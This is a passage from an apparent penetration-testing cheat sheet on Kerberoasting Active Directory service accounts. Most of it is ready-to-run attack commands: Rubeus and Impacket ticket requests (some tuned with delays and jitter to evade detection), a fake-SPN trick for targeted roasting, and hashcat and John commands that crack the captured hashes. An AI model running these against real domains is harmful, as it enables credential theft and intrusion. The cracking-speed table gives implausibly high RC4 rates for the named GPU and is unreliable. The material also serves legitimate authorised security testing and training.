ldapsearch -x -h 10.10.10.5 -b "DC=domain,DC=local" -D "username@domain.local" -W
```

#### Error: "Cracking Takes Too Long"

**Problem:** AES hashes won't crack

**Reality check:**

```
RC4 cracking speed: ~1000 GH/s
AES256 cracking speed: ~0.5 GH/s

AES is ~2000x slower than RC4
```

**Solutions:**

**1. Target RC4 accounts:**

```cmd
# Only roast RC4-capable accounts
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
```

**2. Use better wordlists:**

```bash
# Company-specific wordlist
# Include: company name, location, common patterns
# Example: CompanyName2019!, CompanyName2020!, etc.

hashcat -m 19700 hashes.aes256 company_wordlist.txt -r best64.rule
```

**3. Focus on old passwords:**

```cmd
# Target passwords last set before 2020
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2020
```

**4. Accept reality:** Some passwords may be:

* Too strong to crack
* Using AES with long passwords
* Randomly generated
* Not worth the computing time

#### Error: "Access Denied" When Adding SPN

**Problem:** Targeted kerberoast fails

```
Set-DomainObject : Access is denied
```

**Cause:** You don't actually have GenericWrite/GenericAll

**Verify permissions:**

```powershell
# Check actual ACLs
Get-DomainObjectAcl -Identity targetuser | 
  Where-Object {$_.SecurityIdentifier -eq (Get-DomainUser currentuser).objectsid}
```

**Required permissions:**

* GenericWrite
* GenericAll
* WriteDACL (can grant yourself GenericWrite)
* WriteProperty (servicePrincipalName)

***

### Quick Reference

#### Enumeration Commands

```bash
# Linux - Impacket
GetUserSPNs.py -dc-ip DC_IP DOMAIN/username
GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/username -outputfile hashes.kerberoast
GetUserSPNs.py -request-user svc_sql -dc-ip DC_IP DOMAIN/username

# Windows - setspn
setspn.exe -Q */*

# Windows - PowerView
Get-NetUser -SPN | Select serviceprincipalname,memberof,pwdlastset

# Windows - Rubeus stats (recommended first step)
.\Rubeus.exe kerberoast /stats
```

#### Roasting Commands

```bash
# Linux - Request all
GetUserSPNs.py -request -dc-ip DC_IP DOMAIN/username -outputfile hashes.kerberoast

# Windows - Rubeus all (noisy!)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Windows - Rubeus targeted
.\Rubeus.exe kerberoast /user:svc_sql /nowrap
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2020 /nowrap

# Windows - OPSEC friendly
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
.\Rubeus.exe kerberoast /user:svc_sql /delay:10000 /jitter:20 /nowrap
```

#### Cracking Commands

```bash
# John the Ripper
john --format=krb5tgs --wordlist=rockyou.txt hashes.kerberoast
john --show --format=krb5tgs hashes.kerberoast

# Hashcat - RC4 (mode 13100)
hashcat -m 13100 -a 0 hashes.rc4 rockyou.txt

# Hashcat - AES128 (mode 19600)
hashcat -m 19600 -a 0 hashes.aes128 rockyou.txt

# Hashcat - AES256 (mode 19700)
hashcat -m 19700 -a 0 hashes.aes256 rockyou.txt

# Hashcat with rules
hashcat -m 13100 hashes.rc4 rockyou.txt -r best64.rule

# Show cracked
hashcat -m 13100 hashes.rc4 --show
```

#### Targeted Kerberoast (GenericWrite)

```powershell
# Windows - Manual
Set-DomainObject -Identity targetuser -Set @{serviceprincipalname='fake/Temp123'} -Verbose
.\Rubeus.exe kerberoast /user:targetuser /nowrap /rc4
Set-DomainObject -Identity targetuser -Clear serviceprincipalname -Verbose
```

```bash
# Linux - Automated
targetedKerberoast.py -d 'DOMAIN.LOCAL' -u writer -p 'password'
hashcat -m 13100 target.hash rockyou.txt
```

#### Hash Formats

```
RC4:    $krb5tgs$23$*user$DOMAIN$spn*$hash
AES128: $krb5tgs$17$*user$DOMAIN$spn*$hash
AES256: $krb5tgs$18$*user$DOMAIN$spn*$hash
```

#### Cracking Speed Comparison

```
GPU: NVIDIA RTX 3090

RC4 (13100):    ~1000 GH/s
AES128 (19600): ~1 GH/s    (~1000x slower)
AES256 (19700): ~0.5 GH/s  (~2000x slower)
```

